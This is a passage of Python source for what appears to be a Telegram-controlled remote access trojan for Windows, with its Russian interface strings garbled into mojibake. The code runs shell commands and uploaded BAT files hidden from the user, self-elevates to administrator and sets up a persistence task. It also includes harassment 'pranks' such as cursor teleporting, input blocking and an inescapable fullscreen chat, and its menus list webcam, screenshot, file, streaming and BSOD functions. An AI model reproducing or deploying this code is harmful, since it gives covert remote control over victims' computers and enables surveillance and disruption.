                handle_error(e, "—ç—Ñ—Ñ–µ–∫—Ç–µ –∑–∞–º–æ—Ä–æ–∑–∫–∏")

        def teleport_cursor():
            try:
                if not prank_active:
                    return
                bot.answer_callback_query(call.id, "–ö—É—Ä—Å–æ—Ä —Ç–µ–ª–µ–ø–æ—Ä—Ç–∏—Ä—É–µ—Ç—Å—è!")
                while prank_active:
                    x = random.randint(0, 1920)
                    y = random.randint(0, 1080)
                    ctypes.windll.user32.SetCursorPos(x, y)
                    time.sleep(0.5)
            except Exception as e:
                handle_error(e, "—Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏ –∫—É—Ä—Å–æ—Ä–∞")

        def speak_random_phrases():
            try:
                if not prank_active:
                    return
                phrases = [
                    "–ü—Ä–∏–≤–µ—Ç, —è —Ç–≤–æ–π –∫–æ–º–ø—å—é—Ç–µ—Ä!",
                    "–ù–µ —Ç—Ä–æ–≥–∞–π –º–µ–Ω—è, —è –∑–∞–Ω—è—Ç!",
                    "–¢—ã —Å–µ–≥–æ–¥–Ω—è —Ö–æ—Ä–æ—à–æ –≤—ã–≥–ª—è–¥–∏—à—å!",
                    "–î–∞–≤–∞–π –ø–æ–∏–≥—Ä–∞–µ–º –≤ –∏–≥—Ä—É?",
                    "–Ø —Å–ª–µ–∂—É –∑–∞ —Ç–æ–±–æ–π!",
                    "–•–≤–∞—Ç–∏—Ç –Ω–∞–∂–∏–º–∞—Ç—å –Ω–∞ –∫–ª–∞–≤–∏—à–∏!",
                    "–ú–Ω–µ —Å–∫—É—á–Ω–æ, —Ä–∞–∑–≤–ª–µ–∫–∏ –º–µ–Ω—è!",
                    "–¢—ã –∑–∞–±—ã–ª –∑–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ!",
                    "–Ø –∑–Ω–∞—é, —á—Ç–æ —Ç—ã –¥–µ–ª–∞–µ—à—å!",
                    "–ü–æ—Ä–∞ —Å–¥–µ–ª–∞—Ç—å –ø–µ—Ä–µ—Ä—ã–≤!"
                ]
                engine = pyttsx3.init()
                bot.answer_callback_query(call.id, "–ü–ö –∑–∞–≥–æ–≤–æ—Ä–∏–ª!")
                while prank_active:
                    engine.say(random.choice(phrases))
                    engine.runAndWait()
                    time.sleep(random.uniform(3, 10))
            except Exception as e:
                handle_error(e, "–≥–æ–≤–æ—Ä—è—â–µ–º –ü–ö")

        def move_windows():
            try:
                if not prank_active:
                    return
                bot.answer_callback_query(call.id, "–û–∫–Ω–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω—ã!")
                while prank_active:
                    hwnd = ctypes.windll.user32.GetForegroundWindow()
                    if hwnd:
                        x = random.randint(0, 1000)
                        y = random.randint(0, 600)
                        ctypes.windll.user32.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001)
                    time.sleep(0.5)
            except Exception as e:
                handle_error(e, "–ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–∏ –æ–∫–æ–Ω")

        prank_functions = {
            "rotate": rotate_screen,
            "distort": distort_screen,
            "invert": invert_colors,
            "smiles": dvd_smiles,
            "freeze": freeze_effect,
            "cursor": teleport_cursor,
            "hide_taskbar": lambda: [ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 0), bot.answer_callback_query(call.id, "–ü–∞–Ω–µ–ª—å –∑–∞–¥–∞—á —Å–∫—Ä—ã—Ç–∞!"), [time.sleep(1) for _ in iter(lambda: prank_active, False)], ctypes.windll.user32.ShowWindow(ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None), 1) if prank_active else None],
            "move_windows": move_windows,
            "speak": speak_random_phrases
        }

        if prank_type in prank_functions:
            thread = threading.Thread(target=prank_functions[prank_type], daemon=True)
            prank_threads.append(thread)
            thread.start()
        else:
            bot.answer_callback_query(call.id, "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —à—É—Ç–∫–∞")
    except Exception as e:
        handle_error(e, "–æ–±—Ä–∞–±–æ—Ç–∫–µ —à—É—Ç–∫–∏")

@bot.message_handler(func=lambda message: message.text == "‚õî –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —à—É—Ç–∫–∏")
def stop_pranks(message):
    try:
        if not check_id(message):
            return
        global prank_active, prank_threads, input_blocked, sound_playing
        prank_active = False
        input_blocked = False
        sound_playing = False  # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–≤—É–∫–∞
        unblock_windows()
        pyautogui.FAILSAFE = True
        for thread in prank_threads:
            thread.join(timeout=1)
        prank_threads.clear()
        # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∑–≤—É–∫, –µ—Å–ª–∏ –æ–Ω –≤–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏—Ç—Å—è —á–µ—Ä–µ–∑ winsound
        winsound.PlaySound(None, 0)
        # –£–¥–∞–ª—è–µ–º –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã, –µ—Å–ª–∏ –æ–Ω–∏ —Å—É—â–µ—Å—Ç–≤—É—é—Ç
        for temp_file in ["temp_audio.mp3", "temp_audio.wav"]:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        bot.send_message(message.chat.id, "–í—Å–µ —à—É—Ç–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã, –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞ –æ—Ç–∫–ª—é—á–µ–Ω–∞, –∑–≤—É–∫ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.")
    except Exception as e:
        handle_error(e, "–æ—Å—Ç–∞–Ω–æ–≤–∫–µ —à—É—Ç–æ–∫")

# –ß–∞—Ç
@bot.message_handler(func=lambda message: message.text == "üí¨ –ß–∞—Ç")
def chat_command(message):
    try:
        if not check_id(message):
            return
        global chat_active
        if chat_active:
            bot.send_message(message.chat.id, "–ß–∞—Ç —É–∂–µ –æ—Ç–∫—Ä—ã—Ç")
            return

        chat_active = True
        threading.Thread(target=open_chat, args=(message.chat.id,), daemon=True).start()
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("–ó–∞–∫—Ä—ã—Ç—å —á–∞—Ç", callback_data="close_chat"))
        bot.send_message(message.chat.id, "–ß–∞—Ç –æ—Ç–∫—Ä—ã—Ç. –ù–∞–∂–º–∏, —á—Ç–æ–±—ã –∑–∞–∫—Ä—ã—Ç—å:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–æ—Ç–∫—Ä—ã—Ç–∏–∏ —á–∞—Ç–∞")

def open_chat(chat_id):
    global chat_window, chat_active
    try:
        create_overlay()
        ctk.set_appearance_mode("dark")
        chat_window = ctk.CTk()
        chat_window.attributes('-fullscreen', True)
        chat_window.attributes('-topmost', True)
        chat_window.overrideredirect(True)
        chat_window.protocol("WM_DELETE_WINDOW", lambda: None)

        title_label = ctk.CTkLabel(chat_window, text="üí¨ –ß–ê–¢", font=("Arial", 20, "bold"))
        title_label.pack(pady=10)

        chat_frame = ctk.CTkFrame(chat_window)
        chat_frame.pack(expand=True, fill="both", padx=20, pady=10)
        chat_text = ctk.CTkTextbox(chat_frame, font=("Arial", 14), wrap="word", height=300)
        chat_text.pack(expand=True, fill="both")

        input_frame = ctk.CTkFrame(chat_window)
        input_frame.pack(fill="x", padx=20, pady=10)
        input_field = ctk.CTkEntry(input_frame, font=("Arial", 14), placeholder_text="–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ...")
        input_field.pack(side="left", fill="x", expand=True, padx=(0, 10))
        send_button = ctk.CTkButton(input_frame, text="–û—Ç–ø—Ä–∞–≤–∏—Ç—å", font=("Arial", 14), command=lambda: send_chat_message(chat_id, input_field.get(), chat_text))
        send_button.pack(side="right")

        def send_chat_message(chat_id, text, chat_widget):
            if text.strip():
                bot.send_message(chat_id, text)
                chat_widget.insert("end", f"–í—ã: {text}\n")
                chat_widget.see("end")
                input_field.delete(0, "end")

        chat_window.mainloop()
    except Exception as e:
        handle_error(e, "—Ä–∞–±–æ—Ç–µ —Å —á–∞—Ç–æ–º")
        chat_active = False
        destroy_overlay()

@bot.message_handler(func=lambda message: message.text not in ["üí¨ –ß–∞—Ç", "üì∑ –°–∫—Ä–∏–Ω—à–æ—Ç—ã", "üìπ –í–µ–±-–∫–∞–º–µ—Ä–∞", "üñ± –ú—ã—à–∫–∞", "üìÇ –§–∞–π–ª—ã", "üñ• –°–∏—Å—Ç–µ–º–∞", "üì∫ –ü—Ä–æ—Ü–µ—Å—Å—ã", "üîß –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞", "üì© –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è", "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å", "üì° –°—Ç—Ä–∏–º–∏–Ω–≥", "üéâ –í–µ—Å–µ–ª—å–µ", "üìú –°—Ü–µ–Ω–∞—Ä–∏–∏", "–ù–∞–∑–∞–¥", "‚öôÔ∏è –ê–¥–º–∏–Ω", "üîÑ –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫", "üîÑ –û–±–Ω–æ–≤–∏—Ç—å –±–æ—Ç–∞", "üí• BSOD"])
def handle_chat_message(message):
    try:
        if not check_id(message) or not chat_active or not chat_window:
            return
        chat_text = chat_window.winfo_children()[1].winfo_children()[0]
        chat_text.insert("end", f"–ü–æ–ª—É—á–µ–Ω–æ: {message.text}\n")
        chat_text.see("end")
    except Exception as e:
        handle_error(e, "–æ–±—Ä–∞–±–æ—Ç–∫–µ —Å–æ–æ–±—â–µ–Ω–∏—è —á–∞—Ç–∞")

@bot.callback_query_handler(func=lambda call: call.data == "close_chat")
def close_chat(call):
    try:
        global chat_window, chat_active
        if chat_window and chat_active:
            chat_window.destroy()
            chat_window = None
            chat_active = False
            destroy_overlay()
        bot.answer_callback_query(call.id, "–ß–∞—Ç –∑–∞–∫—Ä—ã—Ç")
        if os.path.exists("fullscreen_image_pid.txt"):
            os.remove("fullscreen_image_pid.txt")
    except Exception as e:
        handle_error(e, "–∑–∞–∫—Ä—ã—Ç–∏–∏ —á–∞—Ç–∞")

# –°—Ü–µ–Ω–∞—Ä–∏–∏
scenarios = {}

@bot.message_handler(func=lambda message: message.text == "üìú –°—Ü–µ–Ω–∞—Ä–∏–∏")
def scenario_menu(message):
    try:
        if not check_id(message):
            return
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add("‚ûï –°–æ–∑–¥–∞—Ç—å", "‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏—Ç—å", "‚¨ÖÔ∏è –ù–∞–∑–∞–¥")
        bot.send_message(message.chat.id, "–°—Ü–µ–Ω–∞—Ä–∏–∏:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–º–µ–Ω—é —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤")

@bot.message_handler(func=lambda message: message.text == "‚ûï –°–æ–∑–¥–∞—Ç—å")
def create_scenario(message):
    try:
        if not check_id(message):
            return
        bot.send_message(message.chat.id, "–û—Ç–ø—Ä–∞–≤—å –∏–º—è —Å—Ü–µ–Ω–∞—Ä–∏—è")
        bot.register_next_step_handler(message, lambda msg: start_scenario_creation(msg))
    except Exception as e:
        handle_error(e, "—Å–æ–∑–¥–∞–Ω–∏–∏ —Å—Ü–µ–Ω–∞—Ä–∏—è")

def start_scenario_creation(message):
    try:
        name = message.text
        scenarios[name] = []
        commands = (
            "–î–æ—Å—Ç—É–ø–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:\n"
            "- screenshot (–±—ã—Å—Ç—Ä—ã–π —Å–∫—Ä–∏–Ω—à–æ—Ç)\n"
            "- shutdown (–≤—ã–∫–ª—é—á–∏—Ç—å –ü–ö)\n"
            "- cmd:–∫–æ–º–∞–Ω–¥–∞ (–≤—ã–ø–æ–ª–Ω–∏—Ç—å CMD)\n"
            "- bat:–ø—É—Ç—å (–∑–∞–ø—É—Å—Ç–∏—Ç—å BAT)\n"
            "- run:–ø—É—Ç—å (–∑–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª)\n"
            "–û—Ç–ø—Ä–∞–≤—å –¥–µ–π—Å—Ç–≤–∏—è –ø–æ –æ–¥–Ω–æ–º—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ: –∫–æ–º–∞–Ω–¥–∞ - –æ–ø–∏—Å–∞–Ω–∏–µ (–∏–ª–∏ –ø—Ä–æ—Å—Ç–æ –∫–æ–º–∞–Ω–¥–∞). –ó–∞–≤–µ—Ä—à–∏ —Å–ª–æ–≤–æ–º '–≥–æ—Ç–æ–≤–æ'."
        )
        bot.send_message(message.chat.id, commands)
        bot.register_next_step_handler(message, lambda msg: add_scenario_action(msg, name))
    except Exception as e:
        handle_error(e, "–Ω–∞—á–∞–ª–µ —Å–æ–∑–¥–∞–Ω–∏—è —Å—Ü–µ–Ω–∞—Ä–∏—è")

def add_scenario_action(message, name):
    try:
        if message.text.lower() == "–≥–æ—Ç–æ–≤–æ":
            bot.send_message(message.chat.id, f"–°—Ü–µ–Ω–∞—Ä–∏–π '{name}' —Å–æ–∑–¥–∞–Ω")
            return
        scenarios[name].append(message.text)
        bot.send_message(message.chat.id, f"–î–æ–±–∞–≤–ª–µ–Ω–æ: {message.text}. –ü—Ä–æ–¥–æ–ª–∂–∞–π –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤—å '–≥–æ—Ç–æ–≤–æ'")
        bot.register_next_step_handler(message, lambda msg: add_scenario_action(msg, name))
    except Exception as e:
        handle_error(e, "–¥–æ–±–∞–≤–ª–µ–Ω–∏–∏ –¥–µ–π—Å—Ç–≤–∏—è –≤ —Å—Ü–µ–Ω–∞—Ä–∏–π")

@bot.message_handler(func=lambda message: message.text == "‚ñ∂Ô∏è –ó–∞–ø—É—Å—Ç–∏—Ç—å")
def run_scenario(message):
    try:
        if not check_id(message):
            return
        markup = types.InlineKeyboardMarkup()
        for name in scenarios:
            markup.add(types.InlineKeyboardButton(name, callback_data=f"run_scenario:{name}"))
        markup.add(types.InlineKeyboardButton("–ù–∞–∑–∞–¥", callback_data="back:scenarios"))
        bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏—Ç–µ —Å—Ü–µ–Ω–∞—Ä–∏–π:", reply_markup=markup)
    except Exception as e:
        handle_error(e, "–∑–∞–ø—É—Å–∫–µ —Å—Ü–µ–Ω–∞—Ä–∏—è")

@bot.callback_query_handler(func=lambda call: call.data.startswith("run_scenario:"))
def execute_scenario(call):
    try:
        name = call.data.split(":", 1)[1]
        for action in scenarios[name]:
            cmd = action.split(" - ")[0].strip()
            if cmd == "screenshot":
                quick_screenshot(call.message)
            elif cmd == "shutdown":
                os.system("shutdown /s /t 0")
            elif cmd.startswith("cmd:"):
                subprocess.run(cmd[4:], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif cmd.startswith("bat:"):
                subprocess.run(f'"{cmd[4:]}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            elif cmd.startswith("run:"):
                os.startfile(cmd[4:])
            time.sleep(1)
        bot.answer_callback_query(call.id, f"–°—Ü–µ–Ω–∞—Ä–∏–π '{name}' –≤—ã–ø–æ–ª–Ω–µ–Ω")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å—Ü–µ–Ω–∞—Ä–∏—è")

# BAT –∏ CMD
@bot.message_handler(content_types=['document'], func=lambda message: message.document.file_name.endswith(".bat"))
def run_bat(message):
    try:
        if not check_id(message):
            return
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        bat_path = "temp.bat"
        with open(bat_path, "wb") as f:
            f.write(downloaded_file)
        subprocess.run(f'"{bat_path}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        os.remove(bat_path)
        bot.send_message(message.chat.id, "BAT-—Ñ–∞–π–ª –≤—ã–ø–æ–ª–Ω–µ–Ω")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ BAT-—Ñ–∞–π–ª–∞")

@bot.message_handler(func=lambda message: message.text.startswith("cmd:"))
def run_hidden_cmd(message):
    try:
        if not check_id(message):
            return
        cmd = message.text[4:]
        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        bot.send_message(message.chat.id, "–ö–æ–º–∞–Ω–¥–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ —Å–∫—Ä—ã—Ç–Ω–æ")
    except Exception as e:
        handle_error(e, "–≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–∫—Ä—ã—Ç–æ–π –∫–æ–º–∞–Ω–¥—ã")

# –û–±—Ä–∞—Ç–Ω—ã–µ –ø–µ—Ä–µ—Ö–æ–¥—ã
@bot.callback_query_handler(func=lambda call: call.data == "back:main")
def back_to_main(call):
    try:
        show_main_menu(call.message)
        bot.edit_message_text("–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:", call.message.chat.id, call.message.message_id, reply_markup=None)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é")

@bot.callback_query_handler(func=lambda call: call.data == "back:processes")
def back_to_processes(call):
    try:
        processes_menu(call.message)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –≤ –º–µ–Ω—é –ø—Ä–æ—Ü–µ—Å—Å–æ–≤")

@bot.callback_query_handler(func=lambda call: call.data == "back:fun")
def back_to_fun(call):
    try:
        fun_menu(call.message)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –≤ –º–µ–Ω—é –≤–µ—Å–µ–ª—å—è")

@bot.callback_query_handler(func=lambda call: call.data == "back:scenarios")
def back_to_scenarios(call):
    try:
        scenario_menu(call.message)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –≤ –º–µ–Ω—é —Å—Ü–µ–Ω–∞—Ä–∏–µ–≤")

@bot.message_handler(func=lambda message: message.text == "–ù–∞–∑–∞–¥")
def back_handler(message):
    try:
        show_main_menu(message)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –Ω–∞–∑–∞–¥")

@bot.callback_query_handler(func=lambda call: call.data.startswith("back:"))
def back_callback(call):
    try:
        dest = call.data.split(":", 1)[1]
        if dest == "main":
            show_main_menu(call.message)
        else:
            markup = create_folder_keyboard(dest)
            bot.edit_message_text("–í—ã–±–µ—Ä–∏—Ç–µ –ø–∞–ø–∫—É –∏–ª–∏ —Ñ–∞–π–ª:", call.message.chat.id, call.message.message_id, reply_markup=markup)
    except Exception as e:
        handle_error(e, "–≤–æ–∑–≤—Ä–∞—Ç–µ –≤ –ø–∞–ø–∫—É")

def is_already_running():
    current_pid = os.getpid()
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.pid != current_pid and proc.name() == os.path.basename(sys.executable):
            return True
    return False

if __name__ == "__main__":
    if is_already_running():
        print("–≠–∫–∑–µ–º–ø–ª—è—Ä –±–æ—Ç–∞ —É–∂–µ –∑–∞–ø—É—â–µ–Ω. –ó–∞–≤–µ—Ä—à–∞–µ–º...")
    try:
        if not is_admin():
            print("–ë–æ—Ç —Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
        else:
            print("–ë–æ—Ç –∑–∞–ø—É—â–µ–Ω —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞.")
            threading.Thread(target=check_and_create_task, daemon=True).start()
            while True:
                try:
                    bot.polling(none_stop=True)
                except Exception as e:
                    handle_error(e, "–æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ polling")
                    print("–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –≤ polling, –ø–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥...")
                    time.sleep(5)
    except Exception as e:
        handle_error(e, "–æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ –±–æ—Ç–∞")
        print("–ë–æ—Ç –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç —Ä–∞–±–æ—Ç—É –Ω–µ—Å–º–æ—Ç—Ä—è –Ω–∞ –æ—à–∏–±–∫—É –≤ –æ—Å–Ω–æ–≤–Ω–æ–º —Ü–∏–∫–ª–µ")